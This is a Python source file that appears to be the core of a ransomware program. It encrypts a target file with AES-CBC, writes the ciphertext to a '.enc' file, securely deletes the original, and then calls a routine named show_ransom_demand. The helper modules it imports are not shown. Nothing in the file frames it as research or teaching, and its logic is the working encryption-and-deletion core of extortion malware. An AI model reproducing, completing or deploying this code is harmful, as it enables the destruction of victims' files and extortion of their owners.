from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from commands.execute import execute
from commands.menace import show_ransom_demand
from commands.delete_file import secure_delete

def encrypt_file(file_path, key):
    print(f'Cryptage du fichier : {file_path}')
    with open(file_path, 'rb') as f:
        file_data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    ciphertext = cipher.encrypt(pad(file_data, AES.block_size))
    return iv + ciphertext

def encrypt_and_delete(file_path, key):
    ciphertext = encrypt_file(file_path, key)
    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, 'wb') as f:
        f.write(ciphertext)
    secure_delete(file_path)

if __name__ == '__main__':
    isCrypted = execute(encrypt_and_delete)
    if isCrypted: 
        show_ransom_demand()